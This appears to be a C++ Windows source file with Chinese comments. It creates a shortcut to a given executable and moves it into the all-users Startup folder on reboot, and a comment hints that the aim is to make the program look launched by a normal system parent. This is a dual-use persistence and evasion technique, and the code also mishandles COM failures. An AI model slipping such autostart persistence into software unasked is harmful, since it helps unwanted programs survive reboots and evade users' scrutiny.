#include "stdafx.h"
#include "windows.h"
#include "TCHAR.h"
#include "Tlhelp32.h"
#include "commctrl.h"
#include "shlwapi.h"
#include <Shlobj.h>
#include "objidl.h "

#include "Iphlpapi.h"
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"shlwapi.lib")




//保证父进程是一个正常的系统程序，则可以做很多事情


HRESULT CreateShortcut(LPCSTR pszPathObj,LPSTR pszParam,LPSTR pszPath,LPSTR pszPathLink,LPSTR pszDesc)
{
	HRESULT hres; //调用 COM 接口方法之后的返回值
	IShellLink *pShellLink;
	IPersistFile *pPersistFile;
	WCHAR wsz[MAX_PATH]; //UNICODE串, 用来存放快捷方式文件名

	CoInitialize(NULL); //初始化 COM 库
	//创建 COM 对象并获取其实现的接口
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,IID_IShellLink,(void **)&pShellLink);
	if(FAILED(hres))
	{
		pShellLink ->Release(); //释放 IShellLink 接口
		CoUninitialize(); //关闭 COM 库, 释放所有 COM 资源
		return FALSE;
	}
	//设置快捷方式的各种属性
	pShellLink->SetPath(pszPathObj); //快捷方式所指的应用程序名
	pShellLink->SetArguments(pszParam); //参数
	pShellLink->SetDescription(pszDesc); //描述
	pShellLink->SetWorkingDirectory(pszPath); //设置工作目录
	//pShellLink->SetIconLocation("C:\\Icon.ico",0); //快捷方式的图标
	//pShellLink->SetHotkey(热键); //启动快捷方式的热键(只能是Ctrl+Alt+_)
	//pShellLink->SetShowCmd(SW_MAXIMIZE); //运行方式(常规窗口,最大化,最小化)
	//查询 IShellLink 接口从而得到 IPersistFile 接口来保存快捷方式
	hres = pShellLink->QueryInterface(IID_IPersistFile,(void **)&pPersistFile);
	if(FAILED(hres))
	{
		pPersistFile ->Release(); //释放 IPersistFile 接口
		pShellLink ->Release(); //释放 IShellLink 接口
		CoUninitialize(); //关闭 COM 库, 释放所有 COM 资源
		return(FALSE);
	}
	//转换 ANSI 串为 UNICODE 串(COM 内部使用 NUICODE)
	MultiByteToWideChar(CP_ACP, 0, pszPathLink, -1, wsz, MAX_PATH);
	//使用 IPersistFile 接口的 Save() 方法保存快捷方式
	hres = pPersistFile ->Save(wsz, TRUE);

	//释放 IPersistFile 接口
	pPersistFile ->Release();
	//释放 IShellLink 接口
	pShellLink ->Release();
	//关闭 COM 库, 释放所有 COM 资源
	CoUninitialize();
	return(hres);
}



void  MoveLinkToStartup4(char *szSrcExeName)
{

	//c:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\";

	TCHAR szLink[MAX_PATH];
	StrCpyA(szLink,szSrcExeName);

	*(StrRChr(szLink,0,'.'))=0;

	StrCatA(szLink,".lnk");

	CreateShortcut(szSrcExeName,0,0,szLink,0);
	TCHAR szStartLink[MAX_PATH];
 	SHGetSpecialFolderPath(NULL,szStartLink,CSIDL_COMMON_STARTUP,0);
 	StrCatA(szStartLink,StrRChr(szLink,0,'\\'));
	DeleteFile(szStartLink);
	MoveFileEx(szLink,szStartLink,MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_REPLACE_EXISTING);
	return ;
}

